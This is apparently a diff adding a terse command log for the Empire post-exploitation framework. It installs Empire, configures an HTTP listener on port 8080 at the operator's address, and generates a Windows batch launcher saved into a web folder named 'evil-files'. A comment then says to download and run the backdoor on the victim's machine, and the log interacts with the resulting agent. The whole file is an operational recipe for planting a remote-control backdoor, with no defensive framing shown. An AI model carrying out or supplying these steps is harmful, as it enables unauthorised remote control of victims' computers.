@@ -1,0 +1,42 @@
+cd /opt/
+ls
+git clone https://github.com/EmpireProject/Empire.git
+ls
+cd Empire/
+ls
+cd Empire/
+ls
+cd setup/
+ls
+./install.sh
+cd ..
+ls
+./ empire
+
+listeners
+use listeners [press spacebar and press tab twice]
+use listener http
+info
+set port 8080
+info
+set Host http://myip:8080
+info
+help
+execute
+back
+list 
+back
+help
+usestager(hit tab twice)
+use stager windows/launcher_bat
+info
+set Listener http
+set outfile /var/www/html/evil-files/empire_http_8080.bat
+info
+execute
+
+#download backdoor in victim machine and run it
+
+agents
+interact k6smz379
+sysinfo
